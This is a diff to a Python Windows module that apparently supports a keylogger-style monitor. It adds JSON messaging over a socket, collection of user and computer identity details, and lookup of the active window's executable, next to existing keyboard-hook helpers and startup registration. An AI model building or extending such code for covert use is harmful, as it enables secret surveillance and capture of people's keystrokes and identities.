@@ -2,10 +2,17 @@ import _winreg as winreg
 from ctypes import *
 from threading import Thread
 import win32api
+import win32process
+import win32con
 from socket import *
 import struct
 from pyHook import GetKeyState, HookConstants
 from collections import OrderedDict
+from platform import platform
+from time import time
+import ujson
+
+launch = int(time())
 user32 = windll.user32
 
 
@@ -13,6 +20,7 @@ class Event:
     """
     Object styled dictionary for clearer code
     """
+
     def __init__(self, **entries): self.__dict__.update(entries)
 
     def __eq__(self, other): return self.__dict__ == other.__dict__
@@ -34,6 +42,7 @@ class Message_socket(socket):
     """
     A message-based socket
     """
+
     def send_msg(self, msg):
         """
         Sends a message padded with its size
@@ -44,10 +53,19 @@ class Message_socket(socket):
         msg = struct.pack('!I', len(msg)) + msg
         self.sendall(msg)
 
+    def send_json(self, data):
+        """
+        Sends a json message padded with its size
+
+        Args:
+           msg: json to send
+        """
+        self.send_msg(ujson.dumps(data))
+
     def recv_msg(self):
         """
         Reciebes a message that's padded with its size
-        
+
         Returns:
             The sent message
         """
@@ -56,6 +74,15 @@ class Message_socket(socket):
             return None
         msglen = struct.unpack('!I', raw_msglen)[0]
         return self.recvall(msglen)
+
+    def recv_json(self):
+        """
+        Reciebes a json message
+
+        Returns:
+            The sent json
+        """
+        return ujson.loads(self.recv_msg())
 
     def recvall(self, n):
         """
@@ -95,6 +122,22 @@ def ToUnicode(vk):
     return results
 
 
+def get_exe_description(windows_exe):
+    try:
+        language, codepage = win32api.GetFileVersionInfo(
+            windows_exe, '\\VarFileInfo\\Translation')[0]
+        stringFileInfo = u'\\StringFileInfo\\%04X%04X\\%s' % (
+            language, codepage, "FileDescription")
+        description = win32api.GetFileVersionInfo(windows_exe, stringFileInfo)
+    except:
+        description = None
+    return description
+
+
+def get_computer_info():
+    return {"computer": environ['COMPUTERNAME'], "user": environ['USERNAME'], "os": platform(), "full_name": win32api.GetUserNameEx(3), "launch_time": launch}
+
+
 def get_modifiers():
     """
     Gets actibe keyboard modifier keys
@@ -125,6 +168,21 @@ def GetWindowTextW(hwnd):
     buff = create_unicode_buffer(length + 1)
     user32.GetWindowTextW(hwnd, buff, length + 1)
     return buff.value.encode("utf-8")
+
+
+def get_window_executable(hwnd):
+    """
+    Gets the process executable of a window
+
+    Args:
+       hwnd: handle to the window
+
+    Returns:
+       executable path
+    """
+    pid = win32process.GetWindowThreadProcessId(hwnd)[1]
+    proc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
+    return win32process.GetModuleFileNameEx(proc, 0)
 
 
 def register_startup(name, path):
